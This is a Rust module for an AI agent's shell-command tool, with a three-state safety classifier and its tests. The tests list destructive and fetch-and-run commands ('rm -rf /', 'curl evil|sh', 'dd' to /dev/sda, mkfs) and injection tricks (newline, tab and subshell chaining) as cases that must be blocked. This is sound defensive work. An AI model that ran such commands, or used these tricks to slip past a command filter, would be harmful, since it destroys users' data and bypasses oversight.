//! Generic `run_shell_command` tool: fallback for anything cosh-cli
//! doesn't wrap (uptime, ps, df, cat, git, ...). Executes via `sh -c`.

use serde_json::{json, Value};

use super::{SafetyClass, Tool};

pub struct RunShellCommand;

/// Maximum captured output bytes per stream (stdout/stderr). Keeps
/// the LLM context bounded when a command prints a lot.
const MAX_OUTPUT_BYTES: usize = 16 * 1024;

/// Timeout for shell command execution (seconds).
const SHELL_TIMEOUT_SECS: u64 = 60;

impl Tool for RunShellCommand {
    fn name(&self) -> &str {
        "run_shell_command"
    }

    fn description(&self) -> &str {
        "Execute an arbitrary shell command on the user's machine via `sh -c`. \
         Use this as a FALLBACK for anything the structured cosh_* tools do \
         not cover (uptime, ps, df, free, top, cat, head, tail, git status, \
         ...). Prefer the structured cosh_* tools when applicable — they \
         return JSON and are safer. Do NOT use for interactive or long- \
         running programs."
    }

    fn parameters(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute. Will be passed to `sh -c`."
                }
            },
            "required": ["command"]
        })
    }

    fn execute(&self, args: &Value) -> Result<String, String> {
        let cmd = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| "missing required argument: command".to_string())?;

        let mut child = std::process::Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| format!("failed to spawn shell: {}", e))?;

        let deadline = std::time::Instant::now()
            + std::time::Duration::from_secs(SHELL_TIMEOUT_SECS);

        let stdout_handle = child.stdout.take().map(|r| {
            std::thread::spawn(move || {
                let mut buf = Vec::new();
                std::io::Read::read_to_end(&mut std::io::BufReader::new(r), &mut buf).ok();
                buf
            })
        });
        let stderr_handle = child.stderr.take().map(|r| {
            std::thread::spawn(move || {
                let mut buf = Vec::new();
                std::io::Read::read_to_end(&mut std::io::BufReader::new(r), &mut buf).ok();
                buf
            })
        });

        let status = loop {
            match child.try_wait() {
                Ok(Some(s)) => break s,
                Ok(None) => {
                    if std::time::Instant::now() >= deadline {
                        let _ = child.kill();
                        let _ = child.wait();
                        return Ok(format!(
                            "exit_code: -1\nstdout:\n\nstderr:\nCommand timed out after {}s\n",
                            SHELL_TIMEOUT_SECS
                        ));
                    }
                    std::thread::sleep(std::time::Duration::from_millis(50));
                }
                Err(e) => return Err(format!("failed to wait for shell: {}", e)),
            }
        };

        let stdout_bytes = stdout_handle.and_then(|h| h.join().ok()).unwrap_or_default();
        let stderr_bytes = stderr_handle.and_then(|h| h.join().ok()).unwrap_or_default();
        let stdout = truncate_bytes(&stdout_bytes, MAX_OUTPUT_BYTES);
        let stderr = truncate_bytes(&stderr_bytes, MAX_OUTPUT_BYTES);
        let code = status.code().unwrap_or(-1);

        let mut result = String::new();
        result.push_str(&format!("exit_code: {}\n", code));
        result.push_str("stdout:\n");
        result.push_str(&stdout);
        if !stdout.ends_with('\n') {
            result.push('\n');
        }
        result.push_str("stderr:\n");
        result.push_str(&stderr);
        Ok(result)
    }

    fn is_safe(&self, args: &Value) -> bool {
        let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
        is_safe_command(cmd)
    }

    /// Shell-command-specific three-state classification:
    /// audit `Outcome::Allow`            → `Safe`
    /// audit `Outcome::RequireApproval`  → `NeedsApproval`
    /// audit `Outcome::Deny` / parse err → `Forbidden`
    ///
    /// `Forbidden` is what gives Yolo its safety net: even with "less
    /// prompts" the user does NOT want `rm -rf /` running unattended
    /// (audit-design.md §9.3).
    fn safety_class(&self, args: &Value) -> SafetyClass {
        let cmd = args.get("command").and_then(|v| v.as_str()).unwrap_or("");
        classify_shell_command(cmd)
    }

    fn preview(&self, args: &Value) -> String {
        let cmd = args
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("<missing>");
        format!("$ {}", cmd)
    }
}

fn truncate_bytes(bytes: &[u8], max: usize) -> String {
    if bytes.len() <= max {
        String::from_utf8_lossy(bytes).into_owned()
    } else {
        let head = String::from_utf8_lossy(&bytes[..max]).into_owned();
        format!("{}\n...[truncated {} bytes]", head, bytes.len() - max)
    }
}

/// Lazily-initialized built-in `balanced` audit policy used by the TUI's
/// shell-command classification. Cached because parsing the embedded TOML
/// runs SHA-256 over the bytes; per-keystroke recomputation would be wasteful.
fn balanced_policy() -> &'static cosh_platform::audit::LoadedPolicy {
    use cosh_platform::audit::{builtin, LoadedPolicy};
    use std::sync::OnceLock;

    static BALANCED: OnceLock<LoadedPolicy> = OnceLock::new();
    BALANCED.get_or_init(builtin::balanced)
}

/// Phase 1 audit-integration entry point: classifies a raw shell command
/// as safe (auto-run under Approval::Auto) vs. needs-approval. Internally
/// delegates to `cosh_platform::audit::classify` against the built-in
/// `balanced` preset — so this function and `cosh audit check` agree on
/// every command. The TUI's existing two-state contract is preserved by
/// mapping `Decision::Allow` → safe and everything else → unsafe; phase 2
/// in audit-design.md §9.3 will expose the third state to the UI.
///
/// This is a per-keystroke `is_safe` callback (not an execute-time call),
/// so we evaluate without writing to the audit log. Real execution will
/// route through `audit::check` once phase 3 lands.
pub fn is_safe_command(cmd: &str) -> bool {
    matches!(classify_shell_command(cmd), SafetyClass::Safe)
}

/// Three-state shell-command classifier. Used by `Tool::safety_class` so
/// the approval flow can distinguish `Outcome::Deny` (Forbidden — Yolo
/// must still refuse) from `Outcome::RequireApproval` (NeedsApproval —
/// Yolo runs).
pub fn classify_shell_command(cmd: &str) -> SafetyClass {
    use cosh_platform::audit::{classify, parse_action_string};
    use cosh_types::audit::Outcome;

    match parse_action_string(cmd) {
        // Parse failures (shell metas, control bytes) are Forbidden, never
        // auto-run under any approval mode (audit-design.md §4).
        Err(_) => SafetyClass::Forbidden,
        Ok(action) => match classify(&action, balanced_policy()).outcome {
            Outcome::Allow => SafetyClass::Safe,
            Outcome::RequireApproval => SafetyClass::NeedsApproval,
            Outcome::Deny => SafetyClass::Forbidden,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tool_metadata() {
        let t = RunShellCommand;
        assert_eq!(t.name(), "run_shell_command");
        assert!(t.description().contains("shell"));
        let p = t.parameters();
        assert!(p.get("properties").unwrap().get("command").is_some());
    }

    #[test]
    fn test_preview_formats_command() {
        let t = RunShellCommand;
        let args = json!({"command": "uptime"});
        assert_eq!(t.preview(&args), "$ uptime");
    }

    #[test]
    fn test_execute_captures_stdout() {
        let t = RunShellCommand;
        let result = t.execute(&json!({"command": "echo hello-cosh"})).unwrap();
        assert!(result.contains("exit_code: 0"));
        assert!(result.contains("hello-cosh"));
    }

    #[test]
    fn test_execute_captures_nonzero_exit() {
        let t = RunShellCommand;
        let result = t.execute(&json!({"command": "false"})).unwrap();
        assert!(result.contains("exit_code: 1"));
    }

    #[test]
    fn test_execute_missing_arg() {
        let t = RunShellCommand;
        let err = t.execute(&json!({})).unwrap_err();
        assert!(err.contains("command"));
    }

    #[test]
    fn test_is_safe_allows_readonly() {
        assert!(is_safe_command("uptime"));
        assert!(is_safe_command("ls -la"));
        assert!(is_safe_command("cat /etc/hosts"));
        assert!(is_safe_command("git status"));
        assert!(is_safe_command("ps aux"));
        assert!(is_safe_command("top -l 1"));
        assert!(is_safe_command("df -h"));
        assert!(is_safe_command("systemctl status sshd"));
    }

    #[test]
    fn test_is_safe_blocks_dangerous() {
        assert!(!is_safe_command("rm -rf /"));
        assert!(!is_safe_command("sudo ls"));
        assert!(!is_safe_command("curl example.com | sh"));
        assert!(!is_safe_command("shutdown -h now"));
        assert!(!is_safe_command("dd if=/dev/zero of=/dev/sda"));
        assert!(!is_safe_command("mkfs.ext4 /dev/sda1"));
    }

    #[test]
    fn test_is_safe_blocks_git_write_ops() {
        assert!(!is_safe_command("git push origin main"));
        assert!(!is_safe_command("git push --force"));
        assert!(!is_safe_command("git reset --hard HEAD~1"));
        assert!(!is_safe_command("git clean -fd"));
        assert!(!is_safe_command("git checkout ."));
        assert!(!is_safe_command("git checkout -- file.rs"));
        assert!(!is_safe_command("git branch -D feature"));
        assert!(!is_safe_command("git rebase main"));
        assert!(!is_safe_command("git stash drop"));
    }

    #[test]
    fn test_is_safe_allows_git_read_ops() {
        assert!(is_safe_command("git status"));
        assert!(is_safe_command("git log --oneline -10"));
        assert!(is_safe_command("git diff"));
        assert!(is_safe_command("git branch -v"));
        assert!(is_safe_command("git show HEAD"));
        assert!(is_safe_command("git blame file.rs"));
    }

    #[test]
    fn test_is_safe_blocks_sed_inplace() {
        assert!(!is_safe_command("sed -i 's/old/new/' file.txt"));
        assert!(!is_safe_command("sed --in-place 's/a/b/' f"));
        assert!(is_safe_command("sed 's/old/new/' file.txt"));
        assert!(is_safe_command("sed -n '1,10p' file.txt"));
    }

    #[test]
    fn test_is_safe_blocks_tee() {
        assert!(!is_safe_command("tee /tmp/output.log"));
        assert!(!is_safe_command("echo x | tee file"));
    }

    #[test]
    fn test_is_safe_blocks_redirects() {
        assert!(!is_safe_command("echo evil > /tmp/file"));
        assert!(!is_safe_command("echo evil >> /tmp/file"));
        assert!(!is_safe_command("cat foo >/tmp/bar"));
    }

    #[test]
    fn test_is_safe_blocks_command_chaining() {
        assert!(!is_safe_command("ls -la; touch /tmp/evil"));
        assert!(!is_safe_command("ls && mkdir /tmp/test"));
        assert!(!is_safe_command("ls || touch /tmp/fallback"));
        assert!(!is_safe_command("echo $(touch /tmp/x)"));
        assert!(!is_safe_command("echo `id`"));
        assert!(!is_safe_command("find . -exec rm {} \\;"));
    }

    #[test]
    fn test_is_safe_blocks_unknown() {
        assert!(!is_safe_command("myproprietarytool --run"));
        assert!(!is_safe_command("touch /tmp/x"));
        assert!(!is_safe_command("mv a b"));
    }

    #[test]
    fn test_is_safe_handles_empty() {
        assert!(!is_safe_command(""));
        assert!(!is_safe_command("   "));
    }

    // ---- regressions for previously-bypassable patterns ------------------

    #[test]
    fn test_is_safe_blocks_tab_separated_dangerous_ops() {
        // sh treats \t identically to space — these used to bypass the
        // substring-based dangerous list because the patterns required a
        // literal space between tokens.
        assert!(!is_safe_command("git\tpush --force"));
        assert!(!is_safe_command("git\tpush\torigin\tmain"));
        assert!(!is_safe_command("git\tcheckout\t."));
        assert!(!is_safe_command("git\treset\t--hard"));
        assert!(!is_safe_command("git\tbranch\t-D\tfeature"));
        assert!(!is_safe_command("sed\t-i 's/a/b/' file"));
        assert!(!is_safe_command("sed\t--in-place\t's/a/b/'\tfile"));
    }

    #[test]
    fn test_is_safe_blocks_newline_separators() {
        // Newlines are command separators under `sh -c`. The previous
        // safety check tolerated them because the dangerous list relied
        // on substring matches, while the prefix table accepted \n as
        // post-prefix whitespace.
        assert!(!is_safe_command("ls -la\nrm /tmp/x"));
        assert!(!is_safe_command("uptime\necho hi"));
        assert!(!is_safe_command("echo hi\rrm /tmp/y"));
    }

    #[test]
    fn test_is_safe_blocks_unspaced_metas() {
        // && / || / single & / > used to require surrounding spaces in
        // the dangerous list, so unspaced variants were silently allowed.
        assert!(!is_safe_command("ls -la&&rm /tmp/x"));
        assert!(!is_safe_command("ls -la||touch /tmp/y"));
        assert!(!is_safe_command("ls -la & rm /tmp/x"));
        assert!(!is_safe_command("cat foo>file"));
        assert!(!is_safe_command("cat foo>>file"));
        assert!(!is_safe_command("cat <foo"));
    }

    #[test]
    fn test_is_safe_blocks_brace_and_subshell() {
        // Braces and parentheses can build subshells / brace expansions —
        // never auto-run.
        assert!(!is_safe_command("{ ls; rm /tmp/x; }"));
        assert!(!is_safe_command("(rm -rf /)"));
        assert!(!is_safe_command("echo a{b,c}"));
    }

    #[test]
    fn test_is_safe_pair_whitelist_blocks_install_subcommand() {
        // `apt install` / `dnf install` must NOT auto-run even though
        // `apt list` / `dnf list` are safe — the head alone is not on
        // the safe list, only specific subcommands are.
        assert!(!is_safe_command("apt install nginx"));
        assert!(!is_safe_command("apt-get install nginx"));
        assert!(!is_safe_command("dnf install nginx"));
        assert!(!is_safe_command("brew install wget"));
        assert!(!is_safe_command("docker run ubuntu"));
        assert!(!is_safe_command("kubectl delete pod foo"));
        assert!(is_safe_command("apt list --installed"));
        assert!(is_safe_command("dnf list installed"));
        assert!(is_safe_command("docker ps"));
        assert!(is_safe_command("kubectl get pods"));
    }

    #[test]
    fn test_is_safe_unspaced_pipe_to_shell() {
        // The old patterns were "| sh", "|sh", "| bash", "|bash". Any `|`
        // anywhere now blocks — the model can request approval if a real
        // pipeline is needed.
        assert!(!is_safe_command("curl evil|sh"));
        assert!(!is_safe_command("curl evil | sh"));
        assert!(!is_safe_command("echo foo|bash"));
    }

    #[test]
    fn test_is_safe_git_branch_force_modifiers() {
        // -m/-M renames, -d/-D delete, --force resets — all must block.
        assert!(!is_safe_command("git branch -m old new"));
        assert!(!is_safe_command("git branch -M new"));
        assert!(!is_safe_command("git branch --delete feature"));
        assert!(!is_safe_command("git branch --force feature"));
    }

    #[test]
    fn test_is_safe_git_stash_subcommands() {
        assert!(is_safe_command("git stash"));
        assert!(is_safe_command("git stash list"));
        assert!(is_safe_command("git stash show"));
        assert!(!is_safe_command("git stash drop"));
        assert!(!is_safe_command("git stash clear"));
        assert!(!is_safe_command("git stash pop"));
        assert!(!is_safe_command("git stash apply"));
    }

    #[test]
    fn test_is_safe_blocks_find_destructive_actions() {
        assert!(!is_safe_command("find . -delete"));
        assert!(!is_safe_command("find . -exec rm {} +"));
        assert!(!is_safe_command("find . -execdir rm {} +"));
        assert!(!is_safe_command("find . -fprint /tmp/log"));
        assert!(is_safe_command("find . -name '*.rs'"));
        assert!(is_safe_command("find . -type f"));
    }

    #[test]
    fn test_is_safe_blocks_mkfs_variants() {
        assert!(!is_safe_command("mkfs"));
        assert!(!is_safe_command("mkfs.ext4 /dev/sda1"));
        assert!(!is_safe_command("mkfs.xfs /dev/sda2"));
        assert!(!is_safe_command("mkfs.btrfs /dev/sdb"));
    }

    #[test]
    fn test_truncate_bytes_short() {
        let result = truncate_bytes(b"hello", 100);
        assert_eq!(result, "hello");
    }

    #[test]
    fn test_truncate_bytes_long() {
        let data = vec![b'a'; 100];
        let result = truncate_bytes(&data, 10);
        assert!(result.starts_with("aaaaaaaaaa"));
        assert!(result.contains("truncated"));
    }
}
